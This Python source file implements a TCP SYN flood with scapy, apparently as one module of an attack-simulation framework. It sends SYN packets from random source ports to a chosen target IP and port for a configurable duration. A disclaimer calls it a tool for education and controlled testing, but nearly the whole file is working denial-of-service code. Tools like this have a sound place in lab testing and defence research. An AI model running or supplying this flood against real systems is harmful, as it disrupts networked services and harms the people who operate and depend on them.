"""
SynFloodAttack.py

Implements a TCP SYN Flood attack.

Parameter summary
+--------------+-------+----------------------------------------------+
| parameter    | type  | default / purpose                            |
+--------------+-------+----------------------------------------------+
| target_port  | int   | 80   - destination TCP port                  |
| duration     | int   | 10   - attack runtime (seconds)              |
+--------------+-------+----------------------------------------------+

DISCLAIMER:
This tool is designed strictly for educational purposes and controlled network security testing.
"""

import time
from scapy.all import IP, TCP, RandShort, send

from attacks.attack import Attack


class SynFloodAttack(Attack):
    """Simulates a SYN Flood attack by sending TCP SYN packets continuously to a target."""

   # ------------------------------------------------------------------ #
    def execute(self) -> None:
        self.wait_until_start()

        port = int(self.parameters.get("target_port", 80))
        duration = int(self.parameters.get("duration", 10))

        self.syn_flood(self.target_ip, port, duration)

    # ------------------------------------------------------------------ #

    def syn_flood(self, target_ip: str, target_port: int, duration: int) -> None:
        """Send TCP SYN packets to target_ip:target_port for duration seconds."""
        start_time = time.time()
        ip_layer = IP(dst=target_ip)
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        packet = ip_layer / tcp_layer

        while time.time() - start_time < duration:
            send(packet, verbose=0)
